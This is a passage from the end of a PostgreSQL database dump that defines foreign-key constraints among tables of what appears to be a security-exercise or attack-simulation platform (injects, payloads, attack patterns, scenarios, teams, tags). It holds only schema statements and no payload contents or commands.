    ADD CONSTRAINT inject_id_fk FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: inject_importers inject_importers_injector_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.inject_importers
    ADD CONSTRAINT inject_importers_injector_contract_id_fkey FOREIGN KEY (importer_injector_contract_id) REFERENCES public.injectors_contracts(injector_contract_id) ON DELETE CASCADE;


--
-- Name: inject_importers inject_importers_mapper_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.inject_importers
    ADD CONSTRAINT inject_importers_mapper_id_fkey FOREIGN KEY (importer_mapper_id) REFERENCES public.import_mappers(mapper_id) ON DELETE SET NULL;


--
-- Name: injects_tests_statuses inject_test_status_inject_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_tests_statuses
    ADD CONSTRAINT inject_test_status_inject_id_fkey FOREIGN KEY (status_inject) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects injector_contract_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT injector_contract_fk FOREIGN KEY (inject_injector_contract) REFERENCES public.injectors_contracts(injector_contract_id) ON DELETE SET NULL;


--
-- Name: injectors_contracts injector_contract_payload_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts
    ADD CONSTRAINT injector_contract_payload_fk FOREIGN KEY (injector_contract_payload) REFERENCES public.payloads(payload_id) ON DELETE CASCADE;


--
-- Name: injectors_contracts injector_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts
    ADD CONSTRAINT injector_id_fk FOREIGN KEY (injector_id) REFERENCES public.injectors(injector_id) ON DELETE CASCADE;


--
-- Name: injectors_contracts_attack_patterns injectors_contracts_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_attack_patterns
    ADD CONSTRAINT injectors_contracts_id_fk FOREIGN KEY (injector_contract_id) REFERENCES public.injectors_contracts(injector_contract_id) ON DELETE CASCADE;


--
-- Name: injectors_contracts_vulnerabilities injectors_contracts_vulnerabilities_injector_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_vulnerabilities
    ADD CONSTRAINT injectors_contracts_vulnerabilities_injector_contract_id_fkey FOREIGN KEY (injector_contract_id) REFERENCES public.injectors_contracts(injector_contract_id) ON DELETE CASCADE;


--
-- Name: injectors_contracts_vulnerabilities injectors_contracts_vulnerabilities_vulnerability_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_vulnerabilities
    ADD CONSTRAINT injectors_contracts_vulnerabilities_vulnerability_id_fkey FOREIGN KEY (vulnerability_id) REFERENCES public.vulnerabilities(vulnerability_id) ON DELETE CASCADE;


--
-- Name: injects_dependencies injects_dependencies_inject_children_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_dependencies
    ADD CONSTRAINT injects_dependencies_inject_children_id_fkey FOREIGN KEY (inject_children_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_dependencies injects_dependencies_inject_parent_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_dependencies
    ADD CONSTRAINT injects_dependencies_inject_parent_id_fkey FOREIGN KEY (inject_parent_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_expectations_traces injects_expectations_traces_expectation_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations_traces
    ADD CONSTRAINT injects_expectations_traces_expectation_fkey FOREIGN KEY (inject_expectation_trace_expectation) REFERENCES public.injects_expectations(inject_expectation_id) ON DELETE CASCADE;


--
-- Name: lessons_categories_teams lessons_category_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories_teams
    ADD CONSTRAINT lessons_category_id_fk FOREIGN KEY (lessons_category_id) REFERENCES public.lessons_categories(lessons_category_id) ON DELETE CASCADE;


--
-- Name: logs_tags log_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs_tags
    ADD CONSTRAINT log_id_fk FOREIGN KEY (log_id) REFERENCES public.logs(log_id) ON DELETE CASCADE;


--
-- Name: mitigations_attack_patterns mitigation_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.mitigations_attack_patterns
    ADD CONSTRAINT mitigation_id_fk FOREIGN KEY (mitigation_id) REFERENCES public.mitigations(mitigation_id) ON DELETE CASCADE;


--
-- Name: organizations_tags organization_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.organizations_tags
    ADD CONSTRAINT organization_id_fk FOREIGN KEY (organization_id) REFERENCES public.organizations(organization_id) ON DELETE CASCADE;


--
-- Name: output_parsers output_parser_payload_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.output_parsers
    ADD CONSTRAINT output_parser_payload_id_fk FOREIGN KEY (output_parser_payload_id) REFERENCES public.payloads(payload_id) ON DELETE CASCADE;


--
-- Name: payloads_tags payload_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_tags
    ADD CONSTRAINT payload_id_fk FOREIGN KEY (payload_id) REFERENCES public.payloads(payload_id);


--
-- Name: payloads_attack_patterns payloads_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_attack_patterns
    ADD CONSTRAINT payloads_id_fk FOREIGN KEY (payload_id) REFERENCES public.payloads(payload_id) ON DELETE CASCADE;


--
-- Name: regex_groups regex_group_contract_output_element_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.regex_groups
    ADD CONSTRAINT regex_group_contract_output_element_id_fk FOREIGN KEY (regex_group_contract_output_element_id) REFERENCES public.contract_output_elements(contract_output_element_id) ON DELETE CASCADE;


--
-- Name: report_informations report_informations_report_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_informations
    ADD CONSTRAINT report_informations_report_id_fkey FOREIGN KEY (report_id) REFERENCES public.reports(report_id) ON DELETE CASCADE;


--
-- Name: report_inject_comment report_inject_comment_inject_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_inject_comment
    ADD CONSTRAINT report_inject_comment_inject_id_fkey FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: report_inject_comment report_inject_comment_report_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_inject_comment
    ADD CONSTRAINT report_inject_comment_report_id_fkey FOREIGN KEY (report_id) REFERENCES public.reports(report_id) ON DELETE CASCADE;


--
-- Name: reports_exercises reports_exercises_exercise_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.reports_exercises
    ADD CONSTRAINT reports_exercises_exercise_id_fkey FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: reports_exercises reports_exercises_report_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.reports_exercises
    ADD CONSTRAINT reports_exercises_report_id_fkey FOREIGN KEY (report_id) REFERENCES public.reports(report_id) ON DELETE CASCADE;


--
-- Name: groups_roles role_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.groups_roles
    ADD CONSTRAINT role_id_fk FOREIGN KEY (role_id) REFERENCES public.roles(role_id);


--
-- Name: roles_capabilities role_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.roles_capabilities
    ADD CONSTRAINT role_id_fk FOREIGN KEY (role_id) REFERENCES public.roles(role_id);


--
-- Name: rule_attributes rule_attributes_importer_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.rule_attributes
    ADD CONSTRAINT rule_attributes_importer_id_fkey FOREIGN KEY (attribute_inject_importer_id) REFERENCES public.inject_importers(importer_id) ON DELETE CASCADE;


--
-- Name: scenarios scenario_custom_dashboard_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios
    ADD CONSTRAINT scenario_custom_dashboard_fk FOREIGN KEY (scenario_custom_dashboard) REFERENCES public.custom_dashboards(custom_dashboard_id) ON DELETE SET NULL;


--
-- Name: articles scenario_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT scenario_fk FOREIGN KEY (article_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: injects scenario_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT scenario_fk FOREIGN KEY (inject_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: lessons_categories scenario_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories
    ADD CONSTRAINT scenario_fk FOREIGN KEY (lessons_category_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: objectives scenario_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.objectives
    ADD CONSTRAINT scenario_fk FOREIGN KEY (objective_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: scenarios_documents scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_documents
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id);


--
-- Name: scenarios_exercises scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_exercises
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: scenarios_tags scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_tags
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: scenarios_teams scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id);


--
-- Name: scenarios_teams_users scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams_users
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: variables scenario_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.variables
    ADD CONSTRAINT scenario_id_fk FOREIGN KEY (variable_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE CASCADE;


--
-- Name: security_coverage_send_job security_coverage_send_job_security_coverage_send_job_simu_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.security_coverage_send_job
    ADD CONSTRAINT security_coverage_send_job_security_coverage_send_job_simu_fkey FOREIGN KEY (security_coverage_send_job_simulation) REFERENCES public.exercises(exercise_id);


--
-- Name: security_coverages security_coverages_security_coverage_scenario_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.security_coverages
    ADD CONSTRAINT security_coverages_security_coverage_scenario_fkey FOREIGN KEY (security_coverage_scenario) REFERENCES public.scenarios(scenario_id) ON DELETE SET NULL;


--
-- Name: asset_groups_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: assets_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: challenges_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: contract_output_elements_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: documents_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.documents_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: exercises_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: findings_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: injects_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: logs_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: organizations_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.organizations_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: payloads_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id);


--
-- Name: scenarios_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: tag_rules tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tag_rules
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id);


--
-- Name: teams_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.teams_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: users_tags tag_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_tags
    ADD CONSTRAINT tag_id_fk FOREIGN KEY (tag_id) REFERENCES public.tags(tag_id) ON DELETE CASCADE;


--
-- Name: tag_rule_asset_groups tag_rule_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tag_rule_asset_groups
    ADD CONSTRAINT tag_rule_id_fk FOREIGN KEY (tag_rule_id) REFERENCES public.tag_rules(tag_rule_id);


--
-- Name: findings_teams team_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_teams
    ADD CONSTRAINT team_id_fk FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: lessons_categories_teams team_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories_teams
    ADD CONSTRAINT team_id_fk FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: scenarios_teams team_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams
    ADD CONSTRAINT team_id_fk FOREIGN KEY (team_id) REFERENCES public.teams(team_id);


--
-- Name: scenarios_teams_users team_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams_users
    ADD CONSTRAINT team_id_fk FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: teams_tags team_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.teams_tags
    ADD CONSTRAINT team_id_fk FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: communications_users user_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.communications_users
    ADD CONSTRAINT user_id_fk FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: findings_users user_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_users
    ADD CONSTRAINT user_id_fk FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: scenarios_teams_users user_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams_users
    ADD CONSTRAINT user_id_fk FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: users_tags user_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_tags
    ADD CONSTRAINT user_id_fk FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- PostgreSQL database dump complete
--

\unrestrict axIpTVAWTDUH6WrfwdgfSYZrA2TmCJoBRbPHBlAMpCS5XLSnIqhpHY8y2la5kCu

